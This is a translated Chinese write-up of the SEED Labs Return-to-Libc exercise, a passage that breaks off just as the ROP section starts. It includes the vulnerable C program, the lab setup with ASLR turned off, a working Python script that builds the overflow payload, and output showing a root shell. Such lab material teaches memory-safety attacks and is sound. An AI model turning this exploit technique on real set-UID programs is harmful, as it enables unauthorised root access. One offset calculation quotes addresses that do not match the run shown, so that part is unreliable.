# Seedlab Ret2Libc 与 ROP WriteUp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 作者 江湾老菜
>
> ## 简介
>
>
> 本文将简单介绍[SeedLab的Ret2Libc](https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/)实验的ROP部分。  
>
> 代码可以从这个[链接](https://seedsecuritylabs.org/Labs_20.04/Files/Return_to_Libc/Labsetup.zip)下载。
Seedlab的文档中提到过一种ROP的攻击方法，但并没有给出优雅的实现。本文将分享一下我的作法，在介绍ROP之前，我会先简单介绍一下这个实验的return
to libc 部分，让大家对实验设置有一个大概的了解。
## Return to Libc 实验
###  实验设置
首先，Return to Libc实验给了一个存在栈溢出的Bug的C程序:
    int bof(char *str){
        char buffer[BUF_SIZE];
        unsigned int *framep;
        // Copy ebp into framep
        asm("movl %%ebp, %0" : "=r" (framep));
        /* print out information for experiment purpose */
        printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
        printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);
        strcpy(buffer, str);
        return 1;
    }
很明显，bug出在strcpy()函数的使用上: 如果字符串str的长度大于BUF_SIZE,
bof()的栈顶和返回地址会被覆盖掉，从而程序的控制流会被劫持。
程序编译的方式为:
    N = 66
    retlib: retlib.c
        gcc -m32 -DBUF_SIZE=${N} -fno-stack-protector -z noexecstack -o $@ $@.c
        sudo chown root $@ && sudo chmod 4755 $@
_sudo chmod 4755_ 中，4的含义是让其他用户能够以root的权限执行retlib程序，也就是说, 这是一个有[Set-UID](https://www.computerhope.com/jargon/s/setuid.htm)权限程序。通过攻击这个有bug的程序，普通用户能够以root的权限执行命令！
另外, 实验将/bin/zsh软连接到/bin/sh:
    sudo ln -sf /bin/zsh /bin/sh
这是因为在system运行的时候，会先调用”/bin/sh”执行程序，再用”/bin/sh”执行指令。而”/bin/sh”默认指向的”/bin/bash”会先drop掉Set-UID权限再执行指令。因此即使system(“/bin/zsh”)，也需要先执行”/bin/sh”,
我们无法直接获取有root权限的shell。这里的设置实际是简化了难度，而在ROP实验中，我们会将恢复”/bin/sh”的软连接。
最后，实验关闭了系统的ASLR, 因此程序段和堆栈的地址是固定的:
    sudo sysctl -w kernel.randomize_va_space=0
###  Return to Libc 攻击方法
####  Return to Libc 程序分析
我们先来分析来一下被攻击程序。通过上面的编译选项我们看到，retlib:
  * 是一个32位的程序:`-m 32`
  * 关闭了栈溢出保护:`-fno-stack-protector`
  * 栈是不可执行的:`-z noexecstack`
程序的main函数会先从badfile文件中读取1000个字符，存在main函数的input[]中，然后把input[]的地址传给刚刚分析的有bug的bof()函数。代码如下:
    int main(int argc, char **argv)
    {
        char input[1000];
        FILE *badfile; 
        badfile = fopen("badfile", "r");
        int length = fread(input, sizeof(char), 1000, badfile);
        printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
        printf("Input size: %d\n", length);
        bof(input);
        printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
        return 1;
    }
我们先创建一个空的badfile，然后运行程序retlib:
    $ touch badfile
    $ make
    $ ./retlib
    Address of input[] inside main():  0xffffc050
    Input size: 300
    Address of buffer[] inside bof():  0xffffc020
    Frame Pointer value inside bof():  0xffffc038
    (^_^)(^_^) Returned Properly (^_^)(^_^)
现在badfile为空,
程序正常返回。但通过这次运行我们通过输出拿到了input[]的地址，bof函数中buffer[]的地址，以及bof函数ebp的地址。由于系统的地址随机化保护是关闭的，下次运行这个程序时，这些地址不变。
由于栈不可执行，我们不能把shellcode放在栈上，然后修改返回地址，让程序返回地址指向shellcode的地址来获得shell权限。 但是,
我们可以把返回地址修改到libc的system()函数，通过执行system(“/bin/sh”), 来拿到shell的权限。
bof()函数执行strcpy()之前，bof的栈地址空间如下:
    Higher Address
    ......
    ----------------------------    return address
    ---------------------------- Stack address of return address:  0xffffc03c
    old ebp
    ---------------------------- Frame Pointer: 0xffffc038
    xxxxx
    xxxxx
    .....
    ---------------------------- Address of buffer[]: 0xffffc020
    Lower Address
而我们需要通过栈溢出把返回地址修改成system()的地址:
    Higher Address
    ----------------------------    "/bin/sh" address
    ---------------------------- Argument 1 address of system(): 0xffffc044
    return address of system
    ----------------------------    system address
    ---------------------------- Stack address of return address:  0xffffc03c
    xxxx
    ---------------------------- Frame Pointer: 0xffffc038
    xxxxx
    xxxxx
    .....
    ---------------------------- Address of buffer[]: 0xffffc020
    Lower Address
这样，程序返回的时候，就会执行system(“/bin/sh”);
####  Return to Libc攻击
首先，通过gdb调试，我们可以获取system()地址和system()返回的地址(exit函数):
    ./retlib
    gdb-peda$ break main 
    gdb-peda$ run
    gdb-peda$ print system
    $1 = {} 0xf7e11420 
    gdb-peda$ print exit
    $2 = {} 0xf7e03f80 
system()的地址是 0xf7e11420, 由于系统的地址随机化保护是关闭的，下次运行程序时，这个地址是不变的。
然后，我们需要把”/bin/sh”地址放在栈上，并把system()第一个参数写成它的地址。由于字符串的结尾’`x00`‘会让strcpy()终止，我们需要把”/bin/sh”放在栈的最后。
通过计算得到返回地址和buffer之间的距离是: 0x1c(0xff83a2cc – 0xff83a2b0)。
因此我们需要在badfile的0x1c地方写入system()地址，在0x1c+4处写入exit地址，在0x1c+8处写入”/bin/sh”地址。”/bin/sh”也是一个字符串，如果写在在了badfile的A个字符处，因此它在栈上的地址是（buffer地址
+ A）。
综合以上分析，构造程序的输入如下:
    #!/usr/bin/env python3
    import sys
    content = bytearray(0xaa for i in range(300))
    content[100: 100+9] = b"/bin/sh\x00"
    X = 0x1c+8
    sh_addr = 0xffffc020 + 100 # The address of "/bin/zsh"
    content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
    Z = 0x1c+4
    exit_addr = 0xf7e03f80 # The address of exit()
    content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
    Y = 0x1c
    system_addr = 0xf7e11420 # The address of system()
    content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
    # Save content to a file
    with open("badfile", "wb") as f:
        f.write(content)
运行脚本可以生成攻击的badfile，再运行retlib程序，可以拿到root权限:
    $ ./exploit.py
    $ ./retlib
    Address of input[] inside main():  0xffffc050
    Input size: 299
    Address of buffer[] inside bof():  0xffffc020
    Frame Pointer value inside bof():  0xffffc038
    # id
    uid=1000(vam) gid=1000(vam) euid=0(root) groups=1000(vam),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),133(docker)
## ROP(Return-Oriented Programming) 实验
###  实验设置
在retlib的基础上，实验恢复了”/bin/sh”指向”/bin/dash”软连接:
    sudo ln -sf /bin/dash /bin/sh